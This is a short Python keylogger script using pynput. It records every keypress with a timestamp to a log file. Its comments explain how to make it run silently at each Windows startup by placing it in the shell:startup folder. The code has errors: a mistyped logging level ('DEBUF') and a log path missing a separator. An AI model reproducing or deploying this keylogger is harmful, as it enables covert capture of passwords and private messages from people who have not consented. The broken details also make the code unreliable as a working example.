from pynput.keyboard import Key, Listener
import logging

log_dir = "C:/Users/mirak/Documents/Python Keylogger Logfile" #This is the directory where the log files will be stored

logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUF, format='%(asctime)s: %(message)s')
#This sets the module, gives it a name, and format it

def on_press(key): #Creats a keypress definition to log a key press to the logging file
     logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()

#The following instructions will make the program run every time the computer turns on.
# Press Win + R and type shell:startup
# Copy the keylogger into the folder, and change  the path where the log will be stored (Line 4)
# Now every time the computer starts the program will run in the background as long as you have Python and PI input installed
# If you want to stop the keylogger, go to Task Manager and end the pythonw.exe task